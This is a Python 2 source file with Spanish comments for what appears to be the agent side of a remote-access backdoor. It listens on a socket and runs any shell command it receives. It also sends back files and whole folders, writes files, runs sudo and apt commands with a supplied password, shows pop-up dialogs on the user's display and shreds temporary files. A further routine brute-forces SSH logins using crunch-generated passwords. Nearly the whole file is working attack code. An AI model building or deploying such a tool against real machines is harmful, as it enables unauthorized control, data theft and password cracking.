#!/usr/bin/python2
#-*- coding:utf-8 -*-
#Se importa el módulo
"""
FUNCIONA EL DOWNLOAD -F
FUNCIONA EL DOWNLOAD -D
"""
import socket, os, getpass, shutil, shlex, commands, tarfile, subprocess, numpy
from pexpect import pxssh
import signal
from subprocess import Popen, PIPE
name_host_server = getpass.getuser()
carpeta_actual_server = os.getcwd()
#instanciamos un objeto para trabajar con el socket
ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server = "127.0.0.1" 
port = 8000
def handler(signum, frame):
    os.system("fuser -k -n tcp %s" % port)
signal.signal(signal.SIGTSTP, handler)
#Puerto y servidor que debe escuchar
ser.bind((server, port))
#Aceptamos conexiones entrantes con el metodo listen. Por parámetro las conexiones simutáneas.
ser.listen(1)
 
#Instanciamos un objeto cli (socket cliente) para recibir datos
cli, addr = ser.accept()  
while True:
    #creamos comandos especiales para el servidor-cliente
    recibido = cli.recv(1073741824) # 1GB
    cd_recibido = recibido.startswith("cd")
    text_recibido = recibido.startswith("-t") 
    ventana_error_recibido = recibido.startswith("-m --error") #ok
    ventana_info_recibido = recibido.startswith("-m --info") #ok
    ventana_input_recibido = recibido.startswith("-m --input") #ok
    ventana_question_recibido = recibido.startswith("-m --question") #ok
    ventana_warning_recibido = recibido.startswith("-m --alert") #ok
    ventana_notification_recibido = recibido.startswith("-m --notification") #ok
    descargar_archivo = recibido.startswith("download -f")
    descargar_carpeta = recibido.startswith("download -d")
    recibido_eliminar_tmp = recibido.startswith("Eliminar download")
    copiar_archivo_listo = recibido.startswith("copy -f ready")
    copiar_carpeta_listo = recibido.startswith("copy -d ready")
    sudo = recibido.startswith("sudo")
    instalar = recibido.startswith("install ready")
    desinstalar = recibido.startswith("uninstall ready")
    fb = recibido.startswith("fb")
    #ejecucion de cuyos comandos
    if text_recibido == 1:
        texto_filtro = recibido.replace("-t ","")
        print(texto_filtro)
        cli.send(texto_filtro)
    elif cd_recibido == 1:
        texto_filtro = recibido.replace("cd ","")
        os.chdir(texto_filtro)
        cli.send(texto_filtro)
    elif ventana_input_recibido == 1:
        texto_filtro = recibido.replace("-m --input ","")
        comando = commands.getoutput("zenity --entry --title '' --text %s --display :0" % texto_filtro)
        cli.send(comando)
    elif ventana_error_recibido == 1:
        texto_filtro = recibido.replace("-m --error ","")
        comando = commands.getoutput("zenity --error --title '' --text %s --display :0" % texto_filtro)
        cli.send(comando)
    elif ventana_info_recibido == 1:
        texto_filtro = recibido.replace("-m --info ","")
        comando = commands.getoutput("zenity --info --title '' --text %s --display :0" % texto_filtro)
        cli.send(comando)
    elif ventana_notification_recibido == 1:
        texto_filtro = recibido.replace("-m --notification ","")
        comando = commands.getoutput("zenity --notification --title '' --text %s --display :0" % texto_filtro)
        cli.send(comando + "\n")
    elif ventana_warning_recibido == 1:
        texto_filtro = recibido.replace("-m --alert ","")
        comando = commands.getoutput("zenity --warning --title '' --text %s --display :0" % texto_filtro)
        cli.send(comando)
    elif ventana_question_recibido == 1:
        texto_filtro = recibido.replace("-m --question ","")
        comando = commands.getoutput("zenity --question --title '' --text %s --display :0" % texto_filtro)
        cli.send(comando)
    elif recibido == "python":
        cli.send("error sintaxis")
    elif recibido == "nano":
        cli.send("error sintaxis")
    elif descargar_archivo == 1:
        archivo_filtro = recibido.replace("download -f ","")
        lista_nombre_archivo = archivo_filtro.split("/")
        ultimo_item_lista = len(lista_nombre_archivo)
        item_nombre = ultimo_item_lista - 1
        nombre_archivo = lista_nombre_archivo[item_nombre]
        nombre_archivo1 = "".join(nombre_archivo.split())
        abrir_archivo = open(archivo_filtro,"rb")
        archivo_bin = abrir_archivo.read()
        cli.send("download -f ready|"+ nombre_archivo1+"|"+ archivo_bin)
    elif descargar_carpeta == 1:
        filtro = recibido.replace("download -d ","")
        lista = filtro.split("/")
        directorio = len(lista) -1
        directorio_fin = lista[directorio]
        directorio_fin1 = "".join(directorio_fin.split())
        destino_gz = "/tmp/"+directorio_fin1
        ruta_comprimida = "/tmp/"+directorio_fin1+".tar.bz2"
        archivo_gz = shutil.make_archive(destino_gz, "bztar",filtro)
        archivo = open(ruta_comprimida,"rb")
        archivo_bin = archivo.read()
        cli.send("download -d ready |"+archivo_bin+" | "+ruta_comprimida)
    elif recibido_eliminar_tmp:
        filtro = recibido.replace("Eliminar download ","")
        os.system("shred -u "+filtro)
    elif copiar_archivo_listo == 1:
        filtro = recibido.replace("copy -f ready |","")
        lista = filtro.split(" | ")
        archivo = lista[0]
        destino = lista[1]
        nombre = lista[2]
        ruta = destino+"/"+nombre
        abrir = open(ruta,"w")
        abrir.write(archivo)
        cli.send("\033[1;32m"+"[+]"+"\033[1;37m"+" Archivo copiado correctamente a"+"\033[1;31m"+":"+"\033[1;37m"+ruta)
        abrir.close()
    elif copiar_carpeta_listo == 1:
        filtro = recibido.replace("copy -d ready |","")
        lista = filtro.split(" | ")
        archivo = lista[0]
        destino = lista[1]
        carpeta = lista[2]
        ruta = "/tmp/"+carpeta+".tar.bz2"
        abrir = open(ruta,"w")
        abrir.write(archivo)
        abrir.close()
        os.system("mkdir "+destino+"/"+carpeta)
        extraer_destino = destino+"/"+carpeta
        desempaquetar = tarfile.open(ruta)
        desempaquetar.extractall(path=extraer_destino)
        os.system("shred -u "+ruta)
        cli.send("Eliminar copy "+ruta)
        #si no hay comandos especiales para ejecutar, se ejecutará los comandos de linux
    elif sudo == 1:
        filtro_c = recibido.replace("sudo ","")
        filtro = recibido.split(" | ")
        comando = filtro[0]
        contrasena = filtro[1]
        command = commands.getoutput("echo "+contrasena+" | sudo -u root -S "+comando)
    elif instalar == 1:
        filtro = recibido.replace("install ready ","")
        lista = filtro.split(" | ")
        comando = lista[0]
        contrasena = lista[1]
        comando = commands.getoutput("echo "+contrasena+" | sudo -u root -S apt-get install -y "+comando)
    elif desinstalar == 1:
        filtro = recibido.replace("uninstall ready ","")
        lista = filtro.split(" | ")
        comando = lista[0]
        contrasena = lista[1]
        comando = commands.getoutput("echo "+contrasena+" | sudo -u root -S apt-get --purge remove -y "+comando)
    elif fb == 1:
        s = pxssh.pxssh()
        ssh = recibido.replace("fb ","")
        lista = ssh.split()
        localhost = lista[0]
        usuario = lista[1]
        comando = commands.getoutput("crunch 1 12 abcdefghijklmnoprstuvwxyzABCDEFGHIJKLMNOPRSTUVWXYZ0123456789 -c 100")
        dic = comando.split("\n")
        del dic[0:7]
        for diccionario in dic:
            try:
                s.login(localhost,usuario,diccionario)
                cli.send("La contrasena es: "+diccionario)
                break;
            except:
                cli.send("Buscando contrasena: "+diccionario)
    else:
        salida = commands.getoutput(recibido)
        cli.send(salida + "\n")           
if ser == True:
    print("Conexion cerrada")
#Cerramos la instancia del socket cliente y servidor
cli.close()
ser.close()
